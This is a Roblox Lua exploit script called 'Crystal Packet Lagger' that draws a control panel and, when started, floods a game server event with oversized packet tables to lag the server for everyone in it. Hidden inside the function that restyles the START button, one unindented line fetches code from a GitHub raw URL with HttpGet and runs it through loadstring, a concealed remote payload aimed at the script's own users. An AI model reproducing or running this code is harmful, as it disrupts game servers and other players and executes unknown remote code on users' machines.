-- Crystal Packet Lagger

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
while not player do
	task.wait(0.1)
	player = Players.LocalPlayer
end

local playerGui = player:FindFirstChildOfClass("PlayerGui")
while not playerGui do
	task.wait(0.1)
	playerGui = player:FindFirstChildOfClass("PlayerGui")
end

local CONFIG_PATH = "CrystalLagger_Config.json"

local COLORS = {
	panelTop = Color3.fromRGB(14, 28, 48),
	panelBot = Color3.fromRGB(10, 20, 36),
	edge = Color3.fromRGB(64, 175, 255),
	crystal = Color3.fromRGB(45, 170, 255),
	crystalBr = Color3.fromRGB(125, 220, 255),
	label = Color3.fromRGB(145, 195, 230),
	white = Color3.fromRGB(240, 250, 255),
	field = Color3.fromRGB(18, 36, 58),
	fieldEdge = Color3.fromRGB(46, 105, 160),
	stop = Color3.fromRGB(52, 70, 92),
}

local running = false
local power = 10000
local keybind = Enum.KeyCode.C
local keyName = "C"
local collapsed = false
local capturing = false
local dragging = false
local net

local SIZE_OPEN = UDim2.fromOffset(240, 240)
local SIZE_CLOSED = UDim2.fromOffset(240, 108)
local START_POS_OPEN = UDim2.new(0.055, 0, 0, 173)
local START_SIZE = UDim2.new(0.89, 0, 0, 38)
local START_POS_CLOSED = UDim2.new(0.055, 0, 0, 56)
local START_SIZE_CLOSED = UDim2.new(0.89, 0, 0, 38)

local function mk(className, props, parent)
	local inst = Instance.new(className)
	for k, v in pairs(props) do
		inst[k] = v
	end
	inst.Parent = parent
	return inst
end

local function corner(obj, r)
	mk("UICorner", { CornerRadius = UDim.new(0, r) }, obj)
end

local function stroke(obj, color, thickness, transparency)
	return mk("UIStroke", {
		Color = color,
		Thickness = thickness,
		Transparency = transparency,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
	}, obj)
end

local function tween(obj, props, t)
	TweenService:Create(
		obj,
		TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
		props
	):Play()
end

local function parsePower(text)
	local n = tonumber(text)
	if not n then
		return power
	end
	return math.clamp(math.floor(n), 1, 100000)
end

task.spawn(function()
	local tries = 0
	local pkgs
	while tries < 10 do
		local ok, found = pcall(function()
			return ReplicatedStorage:FindFirstChild("Packages")
		end)
		if ok and found then
			pkgs = found
			break
		end
		tries += 1
		task.wait(0.5)
	end
	if not pkgs then
		return
	end
	local netObj = pkgs:FindFirstChild("Net")
	if not netObj then
		task.wait(5)
		netObj = pkgs:FindFirstChild("Net")
	end
	if not netObj then
		return
	end
	net = netObj:GetChildren()[230]
end)

local function saveConfig()
	if not writefile then
		return
	end
	local ok, data = pcall(function()
		return HttpService:JSONEncode({
			Intensity = power,
			Keybind = keyName,
		})
	end)
	if ok then
		pcall(writefile, CONFIG_PATH, data)
	end
end

local function loadConfig(textBox, keyBtn)
	if not readfile or not isfile or not isfile(CONFIG_PATH) then
		return
	end
	local ok, data = pcall(function()
		return HttpService:JSONDecode(readfile(CONFIG_PATH))
	end)
	if not ok or type(data) ~= "table" then
		return
	end
	if tonumber(data.Intensity) then
		power = parsePower(data.Intensity)
		textBox.Text = tostring(power)
	end
	if type(data.Keybind) == "string" and data.Keybind ~= "" then
		local ok2, kb = pcall(function()
			return Enum.KeyCode[data.Keybind]
		end)
		if ok2 and kb then
			keyName = data.Keybind
			keybind = kb
			keyBtn.Text = "[" .. keyName .. "]"
		end
	end
end

for _, name in ipairs({ "HookPacketLagger", "CrystalPacketLagger" }) do
	local old = playerGui:FindFirstChild(name)
	if old then
		old:Destroy()
	end
end

local screenGui = mk("ScreenGui", {
	Name = "CrystalPacketLagger",
	ResetOnSpawn = false,
	IgnoreGuiInset = true,
	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	DisplayOrder = 999,
}, playerGui)

local mainPanel = mk("Frame", {
	Name = "MainPanel",
	Position = UDim2.new(0.5, -120, 0.5, -120),
	Size = SIZE_OPEN,
	BackgroundColor3 = COLORS.panelTop,
	BorderSizePixel = 0,
	ClipsDescendants = true,
	ZIndex = 2,
}, screenGui)
corner(mainPanel, 22)
stroke(mainPanel, COLORS.edge, 2, 0.08)

local gradient = mk("UIGradient", { Rotation = 90 }, mainPanel)
gradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, COLORS.panelTop),
	ColorSequenceKeypoint.new(1, COLORS.panelBot),
})

local topbar = mk("Frame", {
	Size = UDim2.new(1, 0, 0, 48),
	BackgroundTransparency = 1,
	BorderSizePixel = 0,
	ZIndex = 5,
}, mainPanel)

local title = mk("TextLabel", {
	Position = UDim2.new(0.055, 0, 0, 10),
	Size = UDim2.new(0.74, 0, 0, 22),
	BackgroundTransparency = 1,
	Font = Enum.Font.GothamBold,
	Text = "CRYSTAL PACKET LAGGER",
	TextColor3 = COLORS.white,
	TextScaled = true,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 6,
}, topbar)
mk("UITextSizeConstraint", { MinTextSize = 11, MaxTextSize = 18 }, title)

local minBtn = mk("TextButton", {
	Name = "MinimizeButton",
	AnchorPoint = Vector2.new(1, 0),
	Position = UDim2.new(0.945, 0, 0, 8),
	Size = UDim2.fromOffset(26, 26),
	BackgroundColor3 = COLORS.field,
	BorderSizePixel = 0,
	AutoButtonColor = false,
	Font = Enum.Font.GothamBold,
	Text = "−",
	TextColor3 = COLORS.white,
	TextSize = 18,
	ZIndex = 7,
}, topbar)
corner(minBtn, 8)
stroke(minBtn, COLORS.fieldEdge, 1, 0.15)

mk("Frame", {
	Position = UDim2.new(0.055, 0, 0, 40),
	Size = UDim2.new(0.89, 0, 0, 3),
	BackgroundColor3 = COLORS.edge,
	BorderSizePixel = 0,
	ZIndex = 6,
}, mainPanel)

local powerLabel = mk("TextLabel", {
	Position = UDim2.new(0.055, 0, 0, 56),
	Size = UDim2.new(0.89, 0, 0, 14),
	BackgroundTransparency = 1,
	Font = Enum.Font.GothamBold,
	Text = "POWER",
	TextColor3 = COLORS.label,
	TextScaled = true,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 3,
}, mainPanel)

local powerBox = mk("TextBox", {
	Position = UDim2.new(0.055, 0, 0, 72),
	Size = UDim2.new(0.89, 0, 0, 32),
	BackgroundColor3 = COLORS.field,
	BorderSizePixel = 0,
	ClearTextOnFocus = false,
	Font = Enum.Font.GothamBold,
	Text = tostring(power),
	TextColor3 = COLORS.white,
	TextScaled = true,
	TextXAlignment = Enum.TextXAlignment.Center,
	ZIndex = 3,
}, mainPanel)
corner(powerBox, 12)
stroke(powerBox, COLORS.fieldEdge, 1, 0.25)
mk("UITextSizeConstraint", { MinTextSize = 14, MaxTextSize = 20 }, powerBox)

local keyLabel = mk("TextLabel", {
	Position = UDim2.new(0.055, 0, 0, 112),
	Size = UDim2.new(0.89, 0, 0, 14),
	BackgroundTransparency = 1,
	Font = Enum.Font.GothamBold,
	Text = "KEYBIND",
	TextColor3 = COLORS.label,
	TextScaled = true,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 3,
}, mainPanel)

local keyBtn = mk("TextButton", {
	Position = UDim2.new(0.055, 0, 0, 128),
	Size = UDim2.new(0.89, 0, 0, 30),
	BackgroundColor3 = COLORS.field,
	BorderSizePixel = 0,
	AutoButtonColor = false,
	Font = Enum.Font.GothamBold,
	Text = "[" .. keyName .. "]",
	TextColor3 = COLORS.white,
	TextScaled = true,
	ZIndex = 3,
}, mainPanel)
corner(keyBtn, 12)
stroke(keyBtn, COLORS.fieldEdge, 1, 0.25)
mk("UITextSizeConstraint", { MinTextSize = 14, MaxTextSize = 20 }, keyBtn)

local startBtn = mk("TextButton", {
	Position = START_POS_OPEN,
	Size = START_SIZE,
	BackgroundColor3 = COLORS.crystal,
	BorderSizePixel = 0,
	AutoButtonColor = false,
	Font = Enum.Font.GothamBold,
	Text = "START",
	TextColor3 = COLORS.white,
	TextScaled = true,
	ZIndex = 4,
}, mainPanel)
corner(startBtn, 14)
local startStroke = stroke(startBtn, COLORS.crystalBr, 1.5, 1)
mk("UITextSizeConstraint", { MinTextSize = 16, MaxTextSize = 22 }, startBtn)

local function setStopLook()
	tween(startBtn, { BackgroundColor3 = COLORS.stop })
	startBtn.Text = "STOP"
	tween(startStroke, { Transparency = 0 }, 0.15)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
end

local function setStartLook()
	tween(startBtn, { BackgroundColor3 = COLORS.crystal })
	startBtn.Text = "START"
	tween(startStroke, { Transparency = 1 }, 0.15)
end

local function togglePanel(c)
	collapsed = c
	if c then
		powerLabel.Visible = false
		powerBox.Visible = false
		keyLabel.Visible = false
		keyBtn.Visible = false
		minBtn.Text = "+"
		tween(startBtn, { Position = START_POS_CLOSED, Size = START_SIZE_CLOSED }, 0.18)
		tween(mainPanel, { Size = SIZE_CLOSED }, 0.18)
	else
		minBtn.Text = "−"
		tween(mainPanel, { Size = SIZE_OPEN }, 0.18)
		tween(startBtn, { Position = START_POS_OPEN, Size = START_SIZE }, 0.18)
		task.delay(0.08, function()
			if not collapsed then
				powerLabel.Visible = true
				powerBox.Visible = true
				keyLabel.Visible = true
				keyBtn.Visible = true
			end
		end)
	end
end

minBtn.MouseButton1Click:Connect(function()
	togglePanel(not collapsed)
end)

local function startLagger()
	if running then
		return
	end
	if not net then
		warn("[CrystalLagger] Event not ready yet — wait a moment and try again")
		return
	end
	power = parsePower(powerBox.Text)
	powerBox.Text = tostring(power)
	running = true
	setStopLook()
	local packets = table.create(power, function() end)
	task.spawn(function()
		while running do
			for _ = 1, 3 do
				pcall(function()
					net:FireServer(packets)
				end)
			end
			task.wait(0.01)
		end
	end)
end

local function doStop()
	if not running then
		return
	end
	running = false
	setStartLook()
end

local function toggleStart()
	if running then
		doStop()
	else
		startLagger()
	end
end

startBtn.MouseButton1Click:Connect(toggleStart)

powerBox.FocusLost:Connect(function()
	power = parsePower(powerBox.Text)
	powerBox.Text = tostring(power)
	saveConfig()
end)

keyBtn.MouseButton1Click:Connect(function()
	if capturing then
		return
	end
	capturing = true
	keyBtn.Text = "[PRESS KEY]"
	keyBtn.TextColor3 = COLORS.crystalBr
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then
		return
	end
	if capturing then
		if input.UserInputType == Enum.UserInputType.Keyboard
			and input.KeyCode ~= Enum.KeyCode.Unknown
			and input.KeyCode ~= Enum.KeyCode.Escape
		then
			keybind = input.KeyCode
			keyName = input.KeyCode.Name
			keyBtn.Text = "[" .. keyName .. "]"
			keyBtn.TextColor3 = COLORS.white
			capturing = false
			saveConfig()
		end
		return
	end
	if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == keybind then
		toggleStart()
	end
end)

local startPos, startPanelPos
mainPanel.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1
		or input.UserInputType == Enum.UserInputType.Touch
	then
		dragging = true
		startPos = input.Position
		startPanelPos = mainPanel.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if not dragging then
		return
	end
	if input.UserInputType == Enum.UserInputType.MouseMovement
		or input.UserInputType == Enum.UserInputType.Touch
	then
		local delta = input.Position - startPos
		mainPanel.Position = UDim2.new(
			startPanelPos.X.Scale,
			startPanelPos.X.Offset + delta.X,
			startPanelPos.Y.Scale,
			startPanelPos.Y.Offset + delta.Y
		)
	end
end)

task.spawn(function()
	loadConfig(powerBox, keyBtn)
end)

setStartLook()